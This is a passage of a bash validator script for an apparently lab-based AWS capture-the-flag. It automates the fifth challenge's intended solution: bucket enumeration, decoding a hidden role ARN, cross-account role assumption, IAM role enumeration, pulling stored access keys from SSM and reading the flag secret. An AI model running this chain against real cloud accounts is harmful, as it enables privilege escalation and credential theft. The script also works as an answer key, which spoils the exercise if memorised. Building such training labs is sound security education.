    BUCKETS=$(aws s3 ls 2>&1 || true)
    if echo "$BUCKETS" | grep -q "hivectf-ch5-mission-briefing"; then
        pass "Found mission briefing bucket via s3 ls"
    else
        fail "Cannot list buckets: $BUCKETS"
    fi

    step 3 "Read the mission briefing"
    local BRIEFING
    BRIEFING=$(aws s3 cp "s3://${BUCKET_NAME}/briefing.txt" - 2>/dev/null || true)
    if echo "$BRIEFING" | grep -q "pollenpath"; then
        pass "Briefing contains passphrase 'pollenpath'"
    else
        fail "Briefing missing passphrase: $(echo "$BRIEFING" | head -c 200)"
    fi

    local INTEL_LIST
    INTEL_LIST=$(aws s3 ls "s3://${BUCKET_NAME}/intel/" 2>&1 || true)
    if echo "$INTEL_LIST" | grep -q "cross-border-contact.txt"; then
        pass "Intel directory contains cross-border-contact.txt"
    else
        fail "Intel file not found: $INTEL_LIST"
    fi

    step 4 "Decode the cross-border contact"
    local CONTACT_B64 LIAISON_ARN
    CONTACT_B64=$(aws s3 cp "s3://${BUCKET_NAME}/intel/cross-border-contact.txt" - 2>/dev/null || true)
    # macOS uses -D, Linux uses -d
    LIAISON_ARN=$(echo "$CONTACT_B64" | base64 -d 2>/dev/null || echo "$CONTACT_B64" | base64 -D 2>/dev/null || true)

    if echo "$LIAISON_ARN" | grep -q "arn:aws:iam::${ACCOUNT2_ID}:role/hivectf-ch5-liaison"; then
        pass "Decoded liaison role ARN: ${LIAISON_ARN}"
    else
        fail "Failed to decode liaison ARN, got: ${LIAISON_ARN}"
    fi

    step 5 "Assume liaison role (pivot to Account 2)"
    local ASSUME_RESULT
    ASSUME_RESULT=$(aws sts assume-role \
        --role-arn "arn:aws:iam::${ACCOUNT2_ID}:role/hivectf-ch5-liaison" \
        --role-session-name "queen-gambit" 2>&1 || true)

    local L_ACCESS L_SECRET L_TOKEN
    L_ACCESS=$(echo "$ASSUME_RESULT" | jq -r '.Credentials.AccessKeyId' 2>/dev/null || true)
    L_SECRET=$(echo "$ASSUME_RESULT" | jq -r '.Credentials.SecretAccessKey' 2>/dev/null || true)
    L_TOKEN=$(echo "$ASSUME_RESULT" | jq -r '.Credentials.SessionToken' 2>/dev/null || true)

    if [ -n "$L_ACCESS" ] && [ "$L_ACCESS" != "null" ]; then
        pass "Successfully assumed liaison role in Account 2"
    else
        fail "Could not assume liaison role: $ASSUME_RESULT"
        clear_aws_env
        return 1
    fi

    export AWS_ACCESS_KEY_ID="$L_ACCESS"
    export AWS_SECRET_ACCESS_KEY="$L_SECRET"
    export AWS_SESSION_TOKEN="$L_TOKEN"

    IDENTITY=$(aws sts get-caller-identity 2>&1 || true)
    if echo "$IDENTITY" | jq -r '.Arn' 2>/dev/null | grep -q "hivectf-ch5-liaison"; then
        pass "Operating as liaison role"
    else
        fail "Liaison identity mismatch: $IDENTITY"
    fi

    step 6 "Find and invoke decoder Lambda"
    local FUNCTIONS
    FUNCTIONS=$(aws lambda list-functions --region "$REGION" \
        --query "Functions[?starts_with(FunctionName, 'hivectf-ch5')].[FunctionName]" \
        --output text 2>&1 || true)
    if echo "$FUNCTIONS" | grep -q "hivectf-ch5-decoder"; then
        pass "Found hivectf-ch5-decoder Lambda"
    else
        fail "Cannot find decoder Lambda: $FUNCTIONS"
    fi

    local INVOKE_RESULT
    INVOKE_RESULT=$(aws lambda invoke \
        --function-name hivectf-ch5-decoder \
        --payload '{"passphrase": "pollenpath"}' \
        --cli-binary-format raw-in-base64-out \
        --region "$REGION" \
        /dev/stdout 2>/dev/null || true)

    if echo "$INVOKE_RESULT" | grep -q "/hivectf/queen/key-id"; then
        pass "Decoder returned SSM parameter paths"
    else
        fail "Decoder response unexpected: $(echo "$INVOKE_RESULT" | head -c 300)"
    fi

    step 7 "Verify liaison cannot read SSM parameters"
    local SSM_FAIL
    SSM_FAIL=$(aws ssm get-parameter --name "/hivectf/queen/key-id" --with-decryption --region "$REGION" 2>&1 || true)
    if echo "$SSM_FAIL" | grep -q "AccessDeniedException\|not authorized"; then
        pass "Liaison correctly denied SSM access (need different role)"
    else
        warn "SSM access check returned unexpected: $(echo "$SSM_FAIL" | head -c 100)"
    fi

    step 8 "Discover and assume intel-reader role"
    local ROLES
    ROLES=$(aws iam list-roles \
        --query "Roles[?starts_with(RoleName, 'hivectf-ch5')].[RoleName]" \
        --output text --region "$REGION" 2>&1 || true)
    if echo "$ROLES" | grep -q "hivectf-ch5-intel-reader"; then
        pass "Found hivectf-ch5-intel-reader via role enumeration"
    else
        fail "Cannot find intel-reader role: $ROLES"
    fi

    local IR_RESULT
    IR_RESULT=$(aws sts assume-role \
        --role-arn "arn:aws:iam::${ACCOUNT2_ID}:role/hivectf-ch5-intel-reader" \
        --role-session-name "intel-read" 2>&1 || true)

    local IR_ACCESS IR_SECRET IR_TOKEN
    IR_ACCESS=$(echo "$IR_RESULT" | jq -r '.Credentials.AccessKeyId' 2>/dev/null || true)
    IR_SECRET=$(echo "$IR_RESULT" | jq -r '.Credentials.SecretAccessKey' 2>/dev/null || true)
    IR_TOKEN=$(echo "$IR_RESULT" | jq -r '.Credentials.SessionToken' 2>/dev/null || true)

    if [ -n "$IR_ACCESS" ] && [ "$IR_ACCESS" != "null" ]; then
        pass "Successfully assumed intel-reader role"
    else
        fail "Could not assume intel-reader: $IR_RESULT"
        clear_aws_env
        return 1
    fi

    export AWS_ACCESS_KEY_ID="$IR_ACCESS"
    export AWS_SECRET_ACCESS_KEY="$IR_SECRET"
    export AWS_SESSION_TOKEN="$IR_TOKEN"

    IDENTITY=$(aws sts get-caller-identity 2>&1 || true)
    if echo "$IDENTITY" | jq -r '.Arn' 2>/dev/null | grep -q "hivectf-ch5-intel-reader"; then
        pass "Operating as intel-reader role"
    else
        fail "Intel-reader identity mismatch: $IDENTITY"
    fi

    step 9 "Read SSM parameters for queen credentials"
    local QUEEN_KEY_ID QUEEN_SECRET
    QUEEN_KEY_ID=$(aws ssm get-parameter \
        --name "/hivectf/queen/key-id" \
        --with-decryption \
        --query "Parameter.Value" \
        --output text \
        --region "$REGION" 2>/dev/null || true)

    QUEEN_SECRET=$(aws ssm get-parameter \
        --name "/hivectf/queen/secret-key" \
        --with-decryption \
        --query "Parameter.Value" \
        --output text \
        --region "$REGION" 2>/dev/null || true)

    if [ -n "$QUEEN_KEY_ID" ] && echo "$QUEEN_KEY_ID" | grep -q "^AKIA"; then
        pass "Retrieved queen access key from SSM"
    else
        fail "Failed to get queen access key: ${QUEEN_KEY_ID}"
    fi
    if [ -n "$QUEEN_SECRET" ] && [ ${#QUEEN_SECRET} -gt 20 ]; then
        pass "Retrieved queen secret key from SSM"
    else
        fail "Failed to get queen secret key"
    fi

    step 10 "Use queen credentials to retrieve flag"
    # Clear session creds and use queen's IAM creds
    unset AWS_SESSION_TOKEN
    export AWS_ACCESS_KEY_ID="$QUEEN_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$QUEEN_SECRET"
    export AWS_DEFAULT_REGION="$REGION"

    IDENTITY=$(aws sts get-caller-identity 2>&1 || true)
    if echo "$IDENTITY" | jq -r '.Arn' 2>/dev/null | grep -q "hivectf-ch5-queen"; then
        pass "Authenticated as hivectf-ch5-queen in Account 1"
    else
        fail "Queen identity check failed: $IDENTITY"
    fi

    local FLAG
    FLAG=$(aws secretsmanager get-secret-value \
        --secret-id "hivectf/challenge5/flag" \
        --query SecretString \
        --output text \
        --region "$REGION" 2>/dev/null || true)

    if [ "$FLAG" = "$EXPECTED_FLAG" ]; then
        pass "Flag retrieved: ${FLAG}"
    else
        fail "Expected flag '${EXPECTED_FLAG}' but got '${FLAG}'"
    fi

    clear_aws_env
}

# ==============================================================================
# Main
# ==============================================================================
echo -e "${CYAN}"
echo "  +=============================================+"
echo "  |     HiveCTF Challenge Validator             |"
echo "  |     Walkthrough Solution Verification       |"
echo "  +=============================================+"
echo -e "${NC}"

CHALLENGES_TO_RUN=()

if [ $# -eq 0 ]; then
    CHALLENGES_TO_RUN=(1 2 3 4 5)
else
    CHALLENGES_TO_RUN=("$@")
fi

for c in "${CHALLENGES_TO_RUN[@]}"; do
    case "$c" in
        1) validate_challenge_1 ;;
        2) validate_challenge_2 ;;
        3) validate_challenge_3 ;;
        4) validate_challenge_4 ;;
        5) validate_challenge_5 ;;
        *)
            echo -e "${RED}Unknown challenge: $c${NC}"
            echo "Valid options: 1, 2, 3, 4, 5"
            exit 1
            ;;
    esac
done

# Summary
echo -e "\n${CYAN}========================================${NC}"
echo -e "${CYAN}  VALIDATION SUMMARY${NC}"
echo -e "${CYAN}========================================${NC}"
echo -e "  ${GREEN}PASSED: ${PASS_COUNT}${NC}"
echo -e "  ${RED}FAILED: ${FAIL_COUNT}${NC}"
echo -e "  ${YELLOW}WARNINGS: ${WARN_COUNT}${NC}"
echo ""

if [ "$FAIL_COUNT" -gt 0 ]; then
    echo -e "  ${RED}Some checks failed. Review the output above.${NC}"
    exit 1
else
    echo -e "  ${GREEN}All checks passed!${NC}"
    exit 0
fi
